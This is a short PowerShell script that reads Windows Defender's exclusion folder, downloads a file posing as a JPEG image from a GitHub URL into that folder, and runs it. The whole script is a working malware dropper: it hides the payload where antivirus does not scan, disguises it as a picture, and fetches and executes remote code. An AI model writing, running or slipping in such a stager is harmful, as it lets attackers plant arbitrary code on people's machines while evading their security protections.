# Retrieve Windows Defender preferences and select ExclusionPath property
$MpPreference = Get-MpPreference
$ExclusionPath = $MpPreference.ExclusionPath

# URL of the file on GitHub
$Url = "https://github.com/Ahad160/Codeing/blob/main/Python%20Language/GUI/Project-Information/P8.jpg?raw=true"  # Replace with the actual URL of the file

# Path to save the downloaded file
$DownloadPath = Join-Path -Path $ExclusionPath -ChildPath "P8.jpg"

# Download the file
Invoke-WebRequest -Uri $Url -OutFile $DownloadPath

# Run the File
Start-Process -FilePath $DownloadPath